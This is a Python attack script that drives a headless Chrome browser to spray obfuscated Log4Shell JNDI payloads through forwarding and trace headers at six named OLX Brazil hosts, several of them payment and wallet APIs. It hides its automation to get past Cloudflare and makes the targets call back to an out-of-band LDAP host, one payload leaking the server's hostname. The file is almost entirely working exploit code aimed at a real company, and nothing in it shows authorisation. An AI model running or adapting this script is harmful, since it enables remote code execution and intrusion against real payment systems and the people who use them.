#!/usr/bin/env python3
"""Cleaner Log4Shell injection: normal UA (pass CF), payloads only in X-* headers.
Status != 403 => reached origin. interactsh detects any JNDI fire."""
import sys, time
from playwright.sync_api import sync_playwright

OOB = sys.argv[1]
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36"
HOSTS = ["apigw.olx.com.br","wallet-api.olx.com.br","api-transaction.olx.com.br",
         "goldpayments.olx.com.br","payment-by-chat-api.olx.com.br","conta.olx.com.br"]

def pl(label):   return "${${lower:j}ndi:${lower:l}dap://"+label+"."+OOB+"/a}"
def plh(label):  return "${jndi:ldap://${hostName}."+label+"."+OOB+"/a}"

with sync_playwright() as p:
    ctx = p.chromium.launch_persistent_context(
        user_data_dir="/tmp/olx_prof2", channel="chrome", headless=True, locale="pt-BR",
        user_agent=UA,
        args=["--no-sandbox","--disable-dev-shm-usage","--lang=pt-BR","--disable-blink-features=AutomationControlled"])
    pg = ctx.pages[0] if ctx.pages else ctx.new_page()
    # warm up CF on main site first
    try: pg.goto("https://www.olx.com.br/", wait_until="domcontentloaded", timeout=40000)
    except: pass
    time.sleep(2)

    cur = {"label":"x"}
    def handler(route):
        h = dict(route.request.headers); L = cur["label"]
        h["X-Forwarded-For"]  = pl(L+"-xff")
        h["X-Api-Version"]    = pl(L+"-ver")
        h["X-Client-Version"] = plh(L+"-cli")
        h["True-Client-IP"]   = pl(L+"-tcip")
        h["X-Forwarded-Host"] = pl(L+"-xfh")
        h["X-Original-URL"]   = "/"+pl(L+"-ourl")
        h["X-Amzn-Trace-Id"]  = pl(L+"-trace")
        try: route.continue_(headers=h)
        except:
            try: route.continue_()
            except: pass
    pg.route("**/*", handler)

    for host in HOSTS:
        cur["label"] = host.split(".")[0].replace("-","")[:16]
        try:
            r = pg.goto(f"https://{host}/", wait_until="domcontentloaded", timeout=30000)
            st = r.status if r else '?'
            print(f"{host}: status={st} reached_origin={'YES' if st!=403 else 'NO(CF-blocked)'} label={cur['label']}")
        except Exception as e:
            print(f"{host}: ERR {repr(e)[:60]} label={cur['label']}")
        time.sleep(2)
    ctx.close()
print("done")
